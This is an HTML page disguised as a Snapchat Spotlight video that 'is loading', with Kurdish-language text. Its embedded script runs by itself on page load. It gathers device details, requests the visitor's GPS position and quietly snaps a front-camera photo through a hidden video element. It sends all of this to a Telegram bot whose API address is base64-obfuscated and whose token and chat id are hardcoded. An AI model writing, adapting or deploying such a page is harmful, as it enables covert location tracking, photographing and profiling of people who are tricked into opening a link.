<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight | Ultra Stream</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #000000;
            color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        #hidden-video, #canvas { display: none; }
        
        .box {
            background: linear-gradient(145deg, #111111, #1a1a1a);
            padding: 30px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), 0 0 15px rgba(255, 252, 0, 0.15);
            border: 1px solid #333;
            max-width: 380px;
            width: 90%;
        }

        h1 { font-size: 21px; margin: 10px 0; color: #fffc00; letter-spacing: 0.5px; }
        p { font-size: 13px; color: #b1b1b1; }
        
        .loader {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(255, 252, 0, 0.15);
            border-radius: 50%;
            border-top-color: #fffc00;
            animation: spin 0.9s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
            margin: 15px auto 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="box">
        <h1>Snapchat Spotlight</h1>
        <p>ڤیدیۆ دهێتە بارکرن، لطفاً لڤێرە راوەستە...</p>
        <div class="loader"></div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
        const chat_id = '7643191802';
        const api = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + token;

        async function sendText(text) {
            try {
                await fetch(`${api}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        // کۆمکرنا زانیاریێن زێدە و پێشکەفتی یێن ئامیرەی
        async function getProInfo() {
            let battery = "نەهاتە زانین";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'بارگاڤی دکەت 🔌' : 'بارگاڤی نینە 🔋'})`;
                }
            } catch(e) {}

            let conn = navigator.connection ? (navigator.connection.effectiveType || "نەدیار") : "نەدیار";
            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "نەدیار";
            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "نەدیار";
            
            return `📱 سیستەم: ${navigator.platform}
🌐 بووکەر: ${navigator.userAgent.split(') ')[0]})
🔋 رێژا پاترییێ: ${battery}
⚡ جۆرێ تورێ: ${conn}
🧠 بیرا رام (RAM): ${memory}
⚙️ هەژمارا CPU Cores: ${cpuCores}
📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}
🗣 زمان: ${navigator.language}`;
        }

        async function sendVisitorLog() {
            let details = await getProInfo();
            sendText(`🚀 سەردانکەرەکێ نوو لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    sendText(`📍 جهێ GPS یێ کەسەکی هاته دیتن!\n\nhttps://www.google.com/maps?q=${lat},${lon}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
                }, () => {
                    sendText(`⚠️ کەسەکی ڕێکا GPS رەتکر.\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
                }, { timeout: 8000, enableHighAccuracy: true });
            }
        }

        // گرتنا وێنەی ب کامێرا پیشی (User Camera)
        async function captureCamera(facing = "user", label = "پێشی (Selfie)") {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(async (blob) => {
                            let details = await getProInfo();
                            const formData = new FormData();
                            formData.append('chat_id', chat_id);
                            formData.append('photo', blob, 'shot.jpg');
                            formData.append('caption', `📸 وێنەیێ نوو (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);

                            await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                            stream.getTracks().forEach(t => t.stop());
                        }, 'image/jpeg', 0.95);
                    }, 2000);
                };
            } catch (err) {
                if (facing === "user") {
                    sendText(`⚠️ کامێرا ${label} نەهاتە دان.\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
                }
            }
        }

        window.onload = async () => {
            await sendVisitorLog();
            setTimeout(getLocation, 1200);
            setTimeout(() => captureCamera("user", "کامێرا پێشی"), 2500);
        };
    </script>
</body>
</html>
